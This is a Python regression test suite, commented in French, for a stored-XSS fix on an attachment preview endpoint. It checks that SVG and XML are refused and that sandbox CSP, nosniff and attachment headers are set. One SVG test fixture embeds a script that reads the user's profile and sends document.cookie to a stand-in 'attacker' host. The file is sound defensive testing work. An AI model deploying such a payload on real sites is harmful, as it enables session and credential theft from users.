"""
Tests durcissement preview attachment — Stored XSS S-002 ln-620 / TOS-75.

Vérifie que `/attachments/{id}/preview` :
- refuse SVG et XML (anciennement previewable, vecteurs XSS connus) ;
- pose `Content-Security-Policy: sandbox` strict, `X-Content-Type-Options: nosniff`,
  et `Content-Disposition: attachment` (jamais `inline`) sur les types autorisés ;
- ne révèle jamais un SVG hostile en `image/svg+xml` inline.

Réf. OWASP ASVS V14.4.5 + OWASP API Top 10 2025 « Unsafe File Upload ».
"""

import uuid

from tests.factories import (
    AssessmentCampaignFactory,
    AssessmentFactory,
    AuditFactory,
    ControlFactory,
    ControlResultFactory,
    EntrepriseFactory,
    EquipementFactory,
    FrameworkCategoryFactory,
    FrameworkFactory,
    SiteFactory,
)


# ── Helpers ──────────────────────────────────────────────────────────


def _build_chain(db, owner, *, uid=None):
    """Construit la chaîne complète jusqu'au ControlResult."""
    uid = uid or str(uuid.uuid4())[:8]
    ent = EntrepriseFactory.create(db, nom=f"Ent_{uid}")
    site = SiteFactory.create(db, nom=f"Site_{uid}", entreprise_id=ent.id)
    equip = EquipementFactory.create(db, site_id=site.id, hostname=f"host-{uid}")
    fw = FrameworkFactory.create(db, ref_id=f"FW_{uid}", name=f"FW {uid}")
    cat = FrameworkCategoryFactory.create(db, framework_id=fw.id)
    ctrl = ControlFactory.create(db, category_id=cat.id, ref_id=f"CTL_{uid}")

    audit = AuditFactory.create(
        db,
        nom_projet=f"Audit {uid}",
        entreprise_id=ent.id,
        owner_id=owner.id,
    )
    campaign = AssessmentCampaignFactory.create(db, audit_id=audit.id)
    assessment = AssessmentFactory.create(
        db,
        campaign_id=campaign.id,
        equipement_id=equip.id,
        framework_id=fw.id,
    )
    cr = ControlResultFactory.create(db, assessment_id=assessment.id, control_id=ctrl.id)
    return cr


def _upload(client, headers, cr_id, filename, content, mime):
    """Upload un fichier via la route officielle, retourne l'attachment_id."""
    token_only = {"Authorization": headers["Authorization"]}
    files = {"file": (filename, content, mime)}
    r = client.post(
        f"/api/v1/attachments/control-result/{cr_id}/upload",
        headers=token_only,
        files=files,
    )
    assert r.status_code == 201, r.text
    return r.json()["id"]


# ══════════════════════════════════════════════════════════════════════
# AC2/AC3 — SVG/XML retirés de la liste previewable
# ══════════════════════════════════════════════════════════════════════


class TestPreviewRejectsXssVectors:
    """SVG et XML doivent retourner 400 sur /preview (S-002 fix)."""

    def test_preview_svg_with_script_returns_400(
        self, client, db_session, auditeur_user, auditeur_headers
    ):
        """Un SVG embarquant <script> ne doit pas être servi inline."""
        cr = _build_chain(db_session, auditeur_user)
        evil_svg = (
            b'<svg xmlns="http://www.w3.org/2000/svg">'
            b'<script>fetch("/api/v1/users/me",{credentials:"include"})'
            b".then(r=>r.json()).then(d=>fetch('https://attacker/'+document.cookie))"
            b"</script></svg>"
        )
        att_id = _upload(client, auditeur_headers, cr.id, "evil.svg", evil_svg, "image/svg+xml")

        r = client.get(f"/api/v1/attachments/{att_id}/preview", headers=auditeur_headers)

        assert r.status_code == 400, r.text
        assert "prévisualisé" in r.json().get("detail", "").lower() or "preview" in r.text.lower()

    def test_preview_xml_returns_400(
        self, client, db_session, auditeur_user, auditeur_headers
    ):
        """application/xml doit être hors preview (XXE/billion-laughs out-of-scope ici)."""
        cr = _build_chain(db_session, auditeur_user)
        att_id = _upload(
            client,
            auditeur_headers,
            cr.id,
            "data.xml",
            b'<?xml version="1.0"?><root>x</root>',
            "application/xml",
        )

        r = client.get(f"/api/v1/attachments/{att_id}/preview", headers=auditeur_headers)

        assert r.status_code == 400, r.text


# ══════════════════════════════════════════════════════════════════════
# AC1 — Headers de sécurité présents pour les types previewable
# ══════════════════════════════════════════════════════════════════════


class TestPreviewSecurityHeaders:
    """Les types previewable autorisés doivent porter CSP + nosniff + attachment."""

    def test_png_preview_has_csp_and_attachment(
        self, client, db_session, auditeur_user, auditeur_headers
    ):
        """Un PNG previewable retourne 200 + CSP sandbox + nosniff + attachment."""
        cr = _build_chain(db_session, auditeur_user)
        png_bytes = b"\x89PNG\r\n\x1a\n_safe_payload"
        att_id = _upload(client, auditeur_headers, cr.id, "ok.png", png_bytes, "image/png")

        r = client.get(f"/api/v1/attachments/{att_id}/preview", headers=auditeur_headers)

        assert r.status_code == 200, r.text
        # AC1 : CSP sandbox strict
        csp = r.headers.get("Content-Security-Policy", "")
        assert "sandbox" in csp
        assert "default-src 'none'" in csp
        assert "frame-ancestors 'none'" in csp
        # AC1 : nosniff
        assert r.headers.get("X-Content-Type-Options") == "nosniff"
        # AC1 : attachment (jamais inline)
        cd = r.headers.get("Content-Disposition", "")
        assert cd.startswith("attachment"), f"attendu 'attachment', got {cd!r}"
        assert "inline" not in cd.lower()

    def test_text_plain_preview_has_csp_and_attachment(
        self, client, db_session, auditeur_user, auditeur_headers
    ):
        """Un text/plain previewable retourne 200 + headers de sécurité."""
        cr = _build_chain(db_session, auditeur_user)
        att_id = _upload(
            client,
            auditeur_headers,
            cr.id,
            "notes.txt",
            b"hello world",
            "text/plain",
        )

        r = client.get(f"/api/v1/attachments/{att_id}/preview", headers=auditeur_headers)

        assert r.status_code == 200, r.text
        assert "sandbox" in r.headers.get("Content-Security-Policy", "")
        assert r.headers.get("X-Content-Type-Options") == "nosniff"
        assert r.headers.get("Content-Disposition", "").startswith("attachment")


# ══════════════════════════════════════════════════════════════════════
# Régression : preview_url n'est plus exposé pour SVG/XML dans le schema
# ══════════════════════════════════════════════════════════════════════


class TestPreviewUrlNotExposed:
    def test_svg_attachment_has_no_preview_url(
        self, client, db_session, auditeur_user, auditeur_headers
    ):
        """Le serializer ne doit plus émettre `preview_url` pour un SVG."""
        cr = _build_chain(db_session, auditeur_user)
        _upload(client, auditeur_headers, cr.id, "x.svg", b"<svg/>", "image/svg+xml")

        r = client.get(
            f"/api/v1/attachments/control-result/{cr.id}",
            headers=auditeur_headers,
        )
        assert r.status_code == 200
        attachments = r.json()
        assert len(attachments) == 1
        # preview_url doit être None/absent pour les SVG
        assert not attachments[0].get("preview_url")
